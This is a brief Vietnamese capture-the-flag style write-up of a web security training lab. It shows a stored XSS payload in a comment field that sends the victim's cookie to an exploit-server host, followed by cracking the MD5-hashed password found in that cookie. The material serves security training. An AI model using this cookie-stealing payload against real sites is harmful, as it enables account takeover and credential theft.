Yêu cầu: Trong bài này Password được hash và lưu trong cookie. Có một lỗ hổng XSS ở phần bình luận. Lấy cookie tk carlos để có password rồi xoá user này.
<br> Tương tự như các bài trước, cookie ở bài này vẫn ở dưới dạng username + password được mã hoá MD5
![image](https://user-images.githubusercontent.com/62832067/156875753-30d13691-be5a-4a70-b21d-49613fb53349.png)

<br> Do đã biết ở phần comment post có XSS nên ta truyền script vào để lấy được logs user cookie trên server 

```<script>document.location='//exploit-acdb1fb01fd4bd38c0ab306301e1009c.web-security-academy.net/'+document.cookie</script>```
![image](https://user-images.githubusercontent.com/62832067/156875939-ccad07b2-248b-4d60-a6b3-e21decacd3aa.png)
![image](https://user-images.githubusercontent.com/62832067/156875940-dec98b74-dbee-45ee-9f17-b29357a7df77.png)
<br> Decode Cookie ta được ![image](https://user-images.githubusercontent.com/62832067/156875996-b3a6f8de-80e6-46c7-843d-8abd0eef67ef.png)
<br> Tiếp tục decode password MD5 -> ```onceuponatime``` 
![image](https://user-images.githubusercontent.com/62832067/156876018-eb922eaf-5252-450e-941f-7a9c4c989f76.png)
![image](https://user-images.githubusercontent.com/62832067/156876057-eaa98890-8402-4fbe-b223-41ccee6f2ea3.png)



